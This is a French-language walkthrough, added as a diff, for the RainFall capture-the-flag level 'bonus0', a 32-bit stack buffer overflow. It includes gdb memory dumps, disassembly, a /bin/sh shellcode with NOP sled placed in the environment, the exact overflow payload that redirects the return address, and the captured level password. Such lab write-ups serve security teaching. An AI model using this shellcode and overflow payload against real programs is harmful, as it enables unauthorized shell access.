@@ -1,0 +1,70 @@
+En regardant ce niveau de plus pret on remarque qu'il segfault lorsque on lui donne 20 octects a la premiere saisie et 20 octect lors de la 2eme saisie
+
+bonus0@RainFall:~$ ./bonus0
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�� AAAAAAAAAAAAAAAAAAAA��
+Segmentation fault (core dumped)
+
+etat de la memoire apres le test du dessus
+(gdb) x/24 $esp
+0xbffff660:	0xbffff676	0x080498d8	0x00000001	0x0804835d
+0xbffff670:	0xb7fd13e4	0x41410016	0x41414141	0x41414141
+0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff690:	0x41414141	0x41414141	0x41414141	0x0ff44141
+0xbffff6a0:	0x4120b7fd	0x41414141	0x41414141	0x41414141
+0xbffff6b0:	0x41414141	0xf4414141	0x00b7fd0f	0xb7fdc858
+
+etat de la memoire en temps normal
+(gdb) x/24 $esp
+0xbffff660:	0xbffff676	0x080498d8	0x00000001	0x0804835d
+			PP EBP		PP EIP
+0xbffff670:	0xb7fd13e4	0x41410016	0x41414141	0x41412041
+					  BUFFEROVERFLOW			
+0xbffff680:	0x41414141	0xb7e50041	0xb7fd0ff4	0xb7e5ee55
+
+0xbffff690:	0xb7fed280	0x00000000	0x080485d9	0xb7fd0ff4
+
+0xbffff6a0:	0x080485d0	0x00000000	0x00000000	0xb7e454d3
+									MAIN EBP	MAIN EIP
+0xbffff6b0:	0x00000001	0xbffff744	0xbffff74c	0xb7fdc858
+
+
+Dans ce bonus0 il nous faut reecrire EIP de la sortie du main qui nous ramener dans la fonction de la libc __init_main__ pour ensuite ramener le flux sur un shellcode nous ouvrant un shell.
+
+nous allons overflow le buffer du main de 54 octects de long.
+
+------------------------------------------------
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080485a4 <+0>:	push   %ebp
+   0x080485a5 <+1>:	mov    %esp,%ebp
+   0x080485a7 <+3>:	and    $0xfffffff0,%esp
+   0x080485aa <+6>:	sub    $0x40,%esp <-- buffer
+   0x080485ad <+9>:	lea    0x16(%esp),%eax <-- argument transmit a <PP> qu'il nous faut overflow
+   0x080485b1 <+13>:	mov    %eax,(%esp)
+   0x080485b4 <+16>:	call   0x804851e <pp>
+
+-------------------------------------------------
+
+Apres quelque test on remarque que les caracteres 10 a 13 de la 2eme saisie ce retrouve a la place de l'EIP de retour du main. 
+
+on exporte notre shellcode dans l'environnement d'execution
+
+export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+
+on recupere l'adresse de notre shellcode
+(gdb) x/s *((char **) environ)
+0xbffff888:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v̀"
+(gdb) x 0xbffff898
+0xbffff898:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v̀"
+
+et on execute le programme avec l'adresse de notre shellcode a la place des caractere 10 a 13 de la 2emesaisie.
+
+cat <(python -c 'print( "A" * 20)') <(python -c 'print( "B" * 9 + "\x98\xf8\xff\xbf" + "B" * 7)') - | ./bonus0
+
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
